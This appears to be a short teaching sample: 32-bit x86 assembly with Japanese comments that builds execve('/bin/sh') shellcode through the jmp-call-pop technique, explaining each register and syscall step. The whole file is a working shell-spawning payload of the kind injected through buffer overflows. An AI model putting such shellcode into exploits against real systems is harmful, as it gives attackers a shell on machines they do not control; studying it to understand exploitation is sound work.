BITS 32

  jmp short two     ; 終端部にあるcall命令に分岐する
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; ebxには文字列のアドレスが保持されている
  xor eax, eax      ; eaxレジスタをゼロクリアする
  mov [ebx+7], al   ; /bin/shという文字列の末尾をnullで終端する
  mov [ebx+8], ebx  ; ebxのアドレスをAAAAのある場所に格納する
  mov [ebx+12], eax ; BBBBのある場所に32ビットのnull終端を格納する
  lea ecx, [ebx+8]  ; argvのポインタとして[ebx+8]のアドレスをecxにロードする
  lea edx, [ebx+12] ; envpのポインタはedx = ebx + 12
  mov al, 11        ; システムコール番号は11
  int 0x80          ; システムコールを実行する

two:
  call one          ; 文字列のアドレスを取得するためのcall命令
  db '/bin/shXAAAABBBB'     ; XAAAABBBBというバイトは実際のところ必要ない
